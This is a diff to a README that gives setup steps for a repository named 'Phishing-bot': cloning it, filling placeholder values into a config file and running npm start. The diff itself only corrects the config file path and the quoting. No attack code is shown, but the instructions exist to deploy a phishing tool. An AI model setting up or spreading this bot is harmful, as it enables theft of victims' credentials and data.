@@ -47,18 +47,18 @@ To run this bot locally or server, follow these steps:
 1. clone the repository
    ```bash
    git clone https://github.com/fahimahamed1/Phishing-bot.git
-   
+
 2. cd Phishing-bot
 
 3. Configure the bot
 
-   open config.js 
+   open server/connection/config.js 
    Add the following configuration values:
    ```bash
    module.exports = {
       botToken: 'YOUR_BOT_TOKEN',
       hostURL: 'YOUR_SERVER_URL',
-      adminChatId: "ADMIN_CHAT_ID"
+      adminChatId: 'YOUR_ADMIN_CHAT_ID'
       };
 4. npm start
 
